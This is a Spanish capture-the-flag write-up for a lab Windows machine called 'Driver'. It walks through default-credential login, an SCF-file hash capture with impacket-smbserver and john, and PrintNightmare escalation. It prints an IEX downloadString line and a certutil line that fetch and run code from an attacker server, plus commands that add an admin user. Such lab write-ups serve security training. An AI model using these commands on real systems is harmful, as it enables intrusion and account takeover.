# Driver

**Sistema Operativo**: Windows

**Dificultad**: Fácil

**Técnicas Vistas**: Password Guessing /
SCF Malicious File /
Print Spooler Local Privilege Escalation (PrintNightmare) [CVE-2021-1675]

Te prepara para las **Certificaciones**: OSCP (Escalada) eJPT<br><br>


![image](https://github.com/user-attachments/assets/0b12302c-9e2d-49ac-af3d-9a836373b8eb)<br><br>

# Reconocimiento

Utilizando `nmap` vemos los puertos abiertos

![Image](https://github.com/user-attachments/assets/6b0499bb-3506-476d-875b-c53146d7882d)<br><br>

Nos va a pedir autenticarnos, simplemente ponemos `admin` de usuario y `admin` de contraseña.

![Image](https://github.com/user-attachments/assets/c8b1dd7e-f85a-45ea-a386-753d5d71e7e1)<br><br>

#  Explotación (archivo .scf malicius)

Creamos un `file.scf` dentro le ponemos nuestra IP, y el smbFolder... Luego interceptamos paquetes SMB `impacket-smbserver smbFolder $(pwd) -smb2support` y obtenemos el usuario "tony" con el hash para crackear.

https://nored0x.github.io/red-teaming/smb-share-scf-file-attacks/

![Image](https://github.com/user-attachments/assets/e48469bb-8feb-4468-bc56-1715a50241e5)<br><br>


Creamos un `hash` que contenga el usuario y el hash de "tony", y lo crackeamos con `john`

![Image](https://github.com/user-attachments/assets/55385be7-b633-494e-983a-c7d5ce101f67)<br><br>


Si pone un `Pwn3d!` Es que el usuario `tony` esta dentro del grupo `Remote Management Users`

![Image](https://github.com/user-attachments/assets/33581bfd-6a88-456a-811c-379b2a75cd04)<br><br>

Estamos dentro

![Image](https://github.com/user-attachments/assets/80789075-134b-4070-9cae-0cfb6699d163)<br><br>

# Escalada de privilegios (Spoolsv)

##### winPeas.exe

https://github.com/peass-ng/PEASS-ng/releases/tag/20240728-0f010225

Descargamos `winPEASx64.exe`

`python3 -m http.server 80` -> Compartimos el binario.

`certutil.exe -f -urlcache -Split http://10.10.10.10/winPEASx64.exe winPEASx64.exe` -> Lo descargamos en la maquina victima.

`.\winPEASx64.exe` ->  Ejecutamos


Con `winPEASx64.exe` vemos que esta el `spoolsv`

![Image](https://github.com/user-attachments/assets/ce571d55-1b07-4ccd-98f4-84be2bc9f513)<br><br>

spoolsv exploit github -> https://github.com/calebstewart/CVE-2021-1675

`wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/refs/heads/main/CVE-2021-1675.ps1` -> Descargamos

`mv CVE-2021-1675.ps1 spool.ps1` -> Cambiamos el nombre

`python3 -m http.server 80` -> Compartimos el spool.ps1

`IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/spool.ps1')` -> maquina victima (ejecutamos el script spool.ps1)

`Invoke-Nightmare -DriverName "Xerox" -NewUser "santiago" -NewPassword "santiago123" ` -> maquina victima. (creamos nuevo usuario)

`evil-winrm -i 10.10.11.106 -u 'santiago' -p 'santiago123' ` -> Ya soy administrador.

![Image](https://github.com/user-attachments/assets/53c81ef3-87a4-4971-b606-b9ec850b82ba)
